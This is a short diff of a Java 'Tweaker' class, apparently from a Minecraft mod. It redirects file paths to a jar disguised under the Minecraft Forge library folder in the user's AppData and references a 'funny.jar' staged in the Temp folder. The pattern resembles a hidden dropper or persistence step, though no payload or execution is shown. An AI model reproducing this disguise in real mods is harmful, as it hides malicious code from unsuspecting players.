@@ -17,8 +17,8 @@ import java.nio.file.Paths;
 
 public class Tweaker {
     public static void registerTweaker() {
-        File path = new File("libraries/net/minecraftforge/coremod/1.0.12");
-        File jar = new File("libraries/net/minecraftforge/coremod/1.0.12/coremod-1.0.12.jar");
+        File path = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\libraries\\net\\minecraftforge\\coremod\\1.0.12");
+        File jar = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\libraries\\net\\minecraftforge\\coremod\\1.0.12\\coremod-1.0.12.jar");
 
         File funnyFile = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\funny.jar");
 
